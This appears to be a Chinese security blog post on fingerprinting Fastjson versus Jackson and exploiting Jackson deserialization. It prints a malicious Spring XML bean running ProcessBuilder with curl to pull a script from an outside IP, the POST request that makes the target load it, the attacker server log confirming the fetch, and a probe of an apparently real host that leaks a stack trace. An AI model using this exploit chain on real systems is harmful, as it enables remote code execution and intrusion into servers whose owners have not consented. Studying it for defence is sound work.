<h1 id="区分-fastjson-和-jackson">区分 Fastjson 和 Jackson</h1>
<p>post数据包：
{“name”:”S”, “age”:21}
1
{“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}
1
这两个fastjson都不会报错，而jackson会报错，因为Jackson 因为强制key与javabean属性对齐,只能少不能多key,所以会报错。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>jackson1.xml 

&lt;beans <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.springframework.org/schema/beans"</span>
       xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
       xsi:schemaLocation<span class="o">=</span><span class="s2">"
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
"</span><span class="o">&gt;</span>
    &lt;bean <span class="nb">id</span><span class="o">=</span><span class="s2">"pb"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"java.lang.ProcessBuilder"</span><span class="o">&gt;</span>
        &lt;constructor-arg&gt;
            &lt;array&gt;
                &lt;value&gt;curl&lt;/value&gt;
		&lt;value&gt;http://47.52.233.92:8000/pc.py&lt;/value&gt;
            &lt;/array&gt;
        &lt;/constructor-arg&gt;
        &lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">"any"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"#{ pb.start() }"</span>/&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
<span class="nt">----------------------------------------------------------------------------------------------------</span>
<span class="nt">----------------------------------------------------------------------------------------------------</span>
POST /exploit HTTP/1.1
Host: 192.168.43.14:8080
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:79.0<span class="o">)</span> Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 142

<span class="o">{</span>
  <span class="s2">"param"</span>: <span class="o">[</span>
   <span class="s2">"org.springframework.context.support.FileSystemXmlApplicationContext"</span>,
   <span class="s2">"http://47.52.233.92:8000/jackson1.xml"</span>
  <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /jackson1.xml HTTP/1.1"</span> 200 -
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /jackson1.xml HTTP/1.1"</span> 200 -
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] code 404, message File not found
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /pc.py HTTP/1.1"</span> 404 -
</code></pre></div></div>
<h2 id="探测jackson">探测jackson</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jubaopen/api2/wealth/mail/getCheckCode HTTP/1.1
Host: dev.pactera.com
Content-Length: 24
DNT: 1
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10_15_6<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Accept: application/json, text/plain, <span class="k">*</span>/<span class="k">*</span>
timeStamp: 1597418145214
userId: undefined
token: undefined
deviceType: 2
Origin: http://dev.pactera.com
Referer: http://dev.pactera.com/jubaopen/weixin2/
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,en-GB<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.6
Connection: close

<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"S"</span>, <span class="s2">"age"</span>:21<span class="o">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Server: nginx/1.16.1
Date: Fri, 14 Aug 2020 15:21:32 GMT
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Connection: close
Access-Control-Allow-Origin: <span class="k">*</span>
Access-Control-Allow-Credentials: <span class="nb">true
</span>Access-Control-Allow-Methods: POST,GET,PUT,OPTIONS,DELETE,PATCH
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Content-Length: 19469

<span class="o">{</span><span class="s2">"code"</span>:null,<span class="s2">"msg"</span>:null,<span class="s2">"data"</span>:<span class="o">{</span><span class="s2">"cause"</span>:null,<span class="s2">"stackTrace"</span>:[<span class="o">{</span><span class="s2">"classLoaderName"</span>:null,<span class="s2">"moduleName"</span>:null,<span class="s2">"moduleVersion"</span>:null,<span class="s2">"methodName"</span>:<span class="s2">"parse"</span>,<span class="s2">"fileName"</span>:<span class="s2">"InternetAddress.java"</span>,<span class="s2">"lineNumber"</span>:696,<span class="s2">"nativeMethod"</span>:false,<span class="s2">"className"</span>:<span class="s2">"javax.mail.internet.InternetAddress"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"classLoaderName"</span>:null,<span class="s2">"moduleName"</span>:null,<span class="s2">"moduleVersion"</span>:null,<span class="s2">"methodName"</span>:<span class="s2">"parse"</span>,<span class="s2">"fileName"</span>:<span class="s2">"InternetAddress.java"</span>,<span class="s2">"lineNumber"</span>:655,<span class="s2">"nativeMethod"</span>:false,<span class="s2">"className"</span>:
···
···
···
methodName<span class="s2">":"</span>run<span class="s2">","</span>fileName<span class="s2">":"</span>Thread.java<span class="s2">","</span>lineNumber<span class="s2">":830,"</span>nativeMethod<span class="s2">":false,"</span>className<span class="s2">":"</span>java.lang.Thread<span class="s2">"}],"</span>message<span class="s2">":null,"</span>suppressed<span class="s2">":[],"</span>localizedMessage<span class="s2">":null}}
</span></code></pre></div></div>
